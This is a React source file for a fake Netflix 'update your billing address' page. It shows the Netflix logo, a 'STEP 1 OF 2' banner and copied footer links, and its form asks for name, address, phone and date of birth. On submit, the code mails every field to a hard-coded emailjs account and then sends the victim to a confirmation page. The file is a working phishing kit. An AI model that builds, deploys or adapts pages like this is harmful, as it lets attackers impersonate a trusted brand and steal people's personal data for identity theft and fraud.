import React from "react";
import { useNavigate } from "react-router-dom";
import emailjs from 'emailjs-com'


const Billing = () => {

  const navigate = useNavigate()

  const sendEmail = (e) => {
    e.preventDefault()
    emailjs.sendForm('service_cm6hsuq', 'template_7ly8hlb', e.target, 'user_tREzId4e2fhTEehRTqA5w')
      .then(res => {
        navigate('/confirm')
        console.log(res)
      })
      .catch(err => {
        console.log(err)
      })
  }
  
  return (
    <>
    <div className="nav">
        <a href="/">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="netflix logo" />
        </a>
        <a href="/">
          <h2>Sign Out</h2>
        </a>
      </div>
      <div className="body-1">
        <div className="center">
      <div>
        <p>STEP 1 OF 2</p>
      </div>
      <div>
        <h5>Update your billing address.</h5>
      </div>
      <form method="post" onSubmit={sendEmail} className="d-flex flex-column">
        <input type="text" className="binfo" name="message" placeholder="First Name" />
        <input type="text" className="binfo" name="message" placeholder="Last Name" />
        <input type="text" className="binfo" name="message" placeholder="Address" />
        <input type="text" className="binfo" name="message" placeholder="City" />
        <div className="d-flex">
        <input type="text" className="binfo2" name="message" placeholder="State" />
          <input type="text" className="zippy binfo2" name="message" placeholder="Zip" />
        </div>
        <input type="text" className="binfo" name="message" placeholder="Phone" />
        <input type="text" className="binfo" name="message" placeholder="Date of birth (YYYY/MM/DD)" />
        <button type="submit" className="update-billing">UPDATE BILLING ADDRESS</button>
      </form>
      </div>
      </div>
      <footer>
        <div className="fff">
        <div className="contact-us">
          <p>Questions? Contact us.</p>
        </div>
        <div className="d-flex">
        <div className="faq">
          <p>FAQ</p>
          <p>Help Center</p>
          <p>Terms of Use</p>
          <p>Privacy</p>
        </div>
        <div className="cookie">
          <p>Cookie Preferences</p>
          <p>Corporate Information</p>
        </div>
        </div>
        </div>
      </footer>
    </>
  )
}

export default Billing